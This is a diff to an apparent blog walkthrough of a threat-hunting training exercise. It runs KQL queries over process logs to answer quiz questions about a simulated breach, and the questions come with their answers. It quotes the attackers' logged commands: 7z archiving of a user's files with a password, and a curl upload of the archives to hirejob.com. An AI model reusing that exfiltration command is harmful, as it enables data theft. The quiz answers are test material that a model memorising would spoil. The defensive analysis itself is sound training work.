@@ -375,3 +375,43 @@ Probably not.
 
 Next, we see a screenshot of a suspicious alert from Ronnie and we have to find the domain. This just requires looking at the image: hirerecruit.com
 
+Next up, we are taught that we can timebound our analysis to find other actions that ocurred around the same time by using this query:
+ProcessEvents
+| where timestamp between (datetime(2024-01-21 07:00:00) .. datetime(2024-01-21 12:00:00))
+| where hostname == "A37A-DESKTOP"
+| order by timestamp asc
+How many total commands were run in this timeframe?
+Answer: Just 2
+
+Next, we are told that there is one command the attackers ran to leverage 7zip to compress all of Ronnie's dank memes into a .7z file. What is the name of the .7z file that contains the stolen memes?
+We see this command: 7z.exe a -t7z C:\Users\romclovin\Documents\DankMemes.7z C:\Users\romclovin\Memes\*.jpg -p thruthW!llS3tUfree
+So the answer is: DankMemes.7z
+
+What is the name of the .7z file that contains files stolen from Ronnie's Documents folder?
+The command run 2 before that was: 7z.exe a -t7z C:\Users\romclovin\Documents\MyStolenDataFromDocuments.7z C:\Users\romclovin\Documents\*.docx -p thruthW!llS3tUfree
+So, let's try MyStolenDataFromDocuments.7z
+
+What is the name of the .7z file that contains files stolen from Ronnie's Desktop folder?
+And between those 2 commands was: 7z.exe a -t7z C:\Users\romclovin\Documents\MyStolenDataFromDesktop.7z C:\Users\romclovin\Desktop\*.docx -p thruthW!llS3tUfree
+Answer: MyStolenDataFromDesktop.7z
+
+What is the password the attackers used to encrypt all of the .7z files?
+See above: thruthW!llS3tUfree
+
+After compressing all the stolen data into .7z files, the attackers exfiltrated the data by uploading it to a custom portal on their website. What is the full command the attackers ran to do this?
+Let's go back to the query:
+ProcessEvents
+| where hostname == "A37A-DESKTOP"
+| where process_commandline contains "7z"
+We see this as the last result: curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php
+
+What domain was the stolen data uploaded to?
+See above: hirejob.com
+
+Query ProcessEvents for all devices at Valdorian Times. Was data stolen from any other devices and uploaded to hirejob.com? (yes/no)
+I ran:
+ProcessEvents
+| where process_commandline contains "hirejob"
+To only show us command line events where hirejob was involved. There are no other results.
+
+
